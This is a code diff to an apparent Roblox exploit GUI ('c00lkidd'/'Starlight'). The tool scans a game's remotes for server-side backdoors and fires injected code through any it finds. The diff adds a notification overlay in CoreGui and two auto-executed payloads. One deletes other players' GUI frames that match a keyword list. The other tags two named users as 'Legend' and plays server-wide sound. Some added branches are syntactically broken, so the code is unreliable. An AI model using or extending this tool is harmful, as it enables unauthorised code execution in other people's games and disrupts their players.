@@ -2205,59 +2205,76 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 	local mode =3
 	local bg=1
 	
-	
 	local TweenService = game:GetService("TweenService")
-	local currentFadeOutThread = nil
-	
-	local function showNotification(titleText, descText, duration)
-		local notif = script.Parent.Notification
-		local title = notif:WaitForChild("Title")
-		local desc = notif:WaitForChild("Desc")
-	
-		-- cancel prev fade out thread
-		if currentFadeOutThread then
-			task.cancel(currentFadeOutThread)
-		end
-	
-		-- set text + show
-		title.Text = titleText
-		desc.Text = descText
-		notif.Visible = true
-		notif.BackgroundTransparency = 1
-		title.TextTransparency = 1
-		desc.TextTransparency = 1
-	
-		-- fade in
-		TweenService:Create(notif, TweenInfo.new(0.3), {
-			BackgroundTransparency = 0.2
-		}):Play()
-		TweenService:Create(title, TweenInfo.new(0.3), {
-			TextTransparency = 0
-		}):Play()
-		TweenService:Create(desc, TweenInfo.new(0.3), {
-			TextTransparency = 0
-		}):Play()
-	
-		-- start new fade out thread
-		currentFadeOutThread = task.spawn(function()
-			task.wait(duration)
-	
-			-- fade out
-			TweenService:Create(notif, TweenInfo.new(0.3), {
-				BackgroundTransparency = 1
-			}):Play()
-			TweenService:Create(title, TweenInfo.new(0.3), {
-				TextTransparency = 1
-			}):Play()
-			TweenService:Create(desc, TweenInfo.new(0.3), {
-				TextTransparency = 1
-			}):Play()
-	
-			task.wait(0.3)
-			notif.Visible = false
-		end)
-	end
-	
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "CoolkidNotificationGui"
+gui.ResetOnSpawn = false
+gui.Parent = game:GetService("CoreGui")
+
+local notif = Instance.new("Frame")
+notif.Name = "Notification"
+notif.Size = UDim2.new(0, 400, 0, 100)
+notif.Position = UDim2.new(0.5, -200, 0.1, 0)
+notif.AnchorPoint = Vector2.new(0.5, 0)
+notif.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+notif.BackgroundTransparency = 1
+notif.BorderSizePixel = 0
+notif.Parent = gui
+
+local stroke = Instance.new("UIStroke", notif)
+stroke.Color = Color3.fromRGB(255, 0, 0)
+stroke.Thickness = 2
+
+local title = Instance.new("TextLabel")
+title.Name = "Title"
+title.Size = UDim2.new(1, -20, 0.4, 0)
+title.Position = UDim2.new(0, 10, 0, 5)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.Font = Enum.Font.Cartoon
+title.TextScaled = true
+title.Text = "c00lkid"
+title.Parent = notif
+
+local desc = Instance.new("TextLabel")
+desc.Name = "Desc"
+desc.Size = UDim2.new(1, -20, 0.5, 0)
+desc.Position = UDim2.new(0, 10, 0.45, 0)
+desc.BackgroundTransparency = 1
+desc.TextColor3 = Color3.fromRGB(230, 230, 230)
+desc.Font = Enum.Font.Cartoon
+desc.TextScaled = true
+desc.Text = ""
+desc.Parent = notif
+
+notif.Visible = false
+
+local currentFadeOutThread
+
+local function showNotification(descriptionText, duration)
+	if currentFadeOutThread then task.cancel(currentFadeOutThread) end
+
+	title.Text = "💥c00lkidd"
+	desc.Text = descriptionText
+	notif.Visible = true
+	notif.BackgroundTransparency = 1
+	title.TextTransparency = 1
+	desc.TextTransparency = 1
+
+	TweenService:Create(notif, TweenInfo.new(0.3), { BackgroundTransparency = 0.5 }):Play()
+	TweenService:Create(title, TweenInfo.new(0.3), { TextTransparency = 0 }):Play()
+	TweenService:Create(desc, TweenInfo.new(0.3), { TextTransparency = 0 }):Play()
+
+	currentFadeOutThread = task.spawn(function()
+		task.wait(duration)
+		TweenService:Create(notif, TweenInfo.new(0.3), { BackgroundTransparency = 1 }):Play()
+		TweenService:Create(title, TweenInfo.new(0.3), { TextTransparency = 1 }):Play()
+		TweenService:Create(desc, TweenInfo.new(0.3), { TextTransparency = 1 }):Play()
+		task.wait(0.3)
+		notif.Visible = false
+	end)
+end
 	
 	local EXCLUDED_REMOTES = {
 		UpdateCurrentCall = true, CanChatWith = true, OnNewMessage = true,
@@ -2398,7 +2415,6 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 	
 				if ok and result then
 					print("c00lkidd: backdoor found:", remotes[i]:GetFullName())
-					showNotification("c00lkidd","True",3)
 				end
 	
 				activeTasks -= 1
@@ -2412,7 +2428,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 	
 		if not foundExploit then
 			print("c00lkidd: backdoor not found")
-			showNotification("c00lkid","False",3)
+			showNotification("False",3)
 		end
 	
 		return foundExploit
@@ -2432,13 +2448,19 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 		if remoteEvent then
 			print("Executing code:", remoteEvent:GetFullName())
 			remoteEvent:FireServer(code)
+			showNotification("Executed.",3)
+		else
+			showNotification("Fail.",3)
 		elseif remoteFunction then
 			print("Executing code:", remoteFunction:GetFullName())
 			pcall(function()
 				remoteFunction:InvokeServer('starlightTSS', code)
+				showNotification("Executed.",3)
+			else
+				showNotification("Fail.",3)
 			end)
 		else
-			showNotification("c00lkid","Inject.",3)
+			showNotification("Inject.",3)
 		end
 	end
 	script.Parent.Sidebar.Presets.MouseButton1Click:Connect(function()
@@ -2530,7 +2552,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 	
 	script.Parent.Logs.ToggleMode.MouseButton1Click:Connect(function()
 		if remoteFunction or remoteEvent then
-			showNotification("c00lkid","No.",3)
+			showNotification("No.",3)
 			return
 		end
 		FinishedFound = false
@@ -2585,7 +2607,7 @@ local function OHZSZXY_fake_script() -- Fake Script: StarterGui.Starlight.Frame.
 			script.Parent.Framee.Log.Visible = true
 			script.Parent.Framee.Log.Text = "[" .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "Unknown") .. "]"
 			script.Parent.stat.ImageColor3 = Color3.fromRGB(159, 226, 191)
-			showNotification("c00lkid","" .. scanTime .."s " .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "nil"),3)
+			showNotification("" .. scanTime .."s " .. (remoteEvent and remoteEvent.Name or remoteFunction and remoteFunction.Name or "nil"),5)
                      -- Auto executes-
 	                fireRemoteEvent('local Players=game:GetService("Players");local suspiciousKeywords={"hd admin","ranker","java1","darklord","pracharatbampen","kidd","k1dd","k00p","l**pzworld","tubers","h01pk","ban","ban gui","itsnotskeleton","l0ck","andres","xxandresxx","c00lgui","c00l","elmarz","teamf*t","5x5x5x5","g00b","kick","ban","undetectable gui","undetectable","acron","russia","infector","potato","sans_gboard","l*ckgui","starp4tch","user1337","menotgonnadobadstuff","8t010t8","darius","j00p","144anz","sigma","noot","1x1x1x1","lacking923","kaax","s1n","k_aax","ep1c","zazol","lalol","cxyz","saudi","koma","gigxxx","hax0rz","g00l","enstrio","br1cked"};local function isSuspicious(str)str=str:lower();for _,k in ipairs(suspiciousKeywords)do if str:find(k)then return true end end return false end;local function getOwningPlayer(i)local p=i;while p and not p:IsA("PlayerGui")do p=p.Parent end;if p and p:IsA("PlayerGui")then local c=p.Parent;return Players:GetPlayerFromCharacter(c)or Players:FindFirstChild(c.Name)end;return nil end;local function deleteIfSuspicious(i)if i:IsA("TextLabel")or i:IsA("Frame")then local n=i.Name;local t=i:IsA("TextLabel")and i.Text or"";if isSuspicious(n)or isSuspicious(t)then local f=i;while f and not f:IsA("Frame")do f=f.Parent end;if f then local pl=getOwningPlayer(f);local h=Instance.new("Hint",workspace);h.Text="[Skid] Deleted sus Frame: "..f.Name..(pl and" (user: "..pl.Name..")"or"");task.delay(3,function()h:Destroy()end);f:Destroy()end end end end;for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end;game.DescendantAdded:Connect(function(o)pcall(deleteIfSuspicious,o)end);task.spawn(function()while true do for _,o in ipairs(game:GetDescendants())do pcall(deleteIfSuspicious,o)end;task.wait(5)end end);')
                         fireRemoteEvent('for _,p in ipairs(game.Players:GetPlayers())do if p.Name=="greguiscool"or p.Name=="raizarit"then if p.Character and p.Character:FindFirstChild("Head")then local t=Instance.new("BillboardGui");t.Name="NameTag";t.Adornee=p.Character.Head;t.Parent=p.Character.Head;t.Size=UDim2.new(0,200,0,50);t.StudsOffset=Vector3.new(0,2.5,0);t.AlwaysOnTop=true;local l=Instance.new("TextLabel",t);l.Size=UDim2.new(1,0,1,0);l.BackgroundTransparency=1;l.Font=Enum.Font.Arcade;l.TextScaled=true;l.TextColor3=Color3.fromRGB(255,223,0);if p.Name=="greguiscool"then l.Text="👑The Legend👑";elseif p.Name=="raizarit"then l.Text="⚡The Legend⚡";end end end end;local e=Instance.new("Hint",workspace);e.Text="⚡ A Legendary Presence Has Entered the Realm! All Hail the Legend! ⚡";local s=Instance.new("Sound");s.Parent=workspace;s.SoundId="rbxassetid://118529969200894";s.Looped=true;s.Volume=1;s.PlaybackSpeed=1;s.TimePosition=41;s:Play();wait(13.3);local d=2;local w=d/20;local v=s.Volume;for i=1,20 do s.Volume=v*(1-i/20);wait(w);end;s:Stop();e:Destroy();')
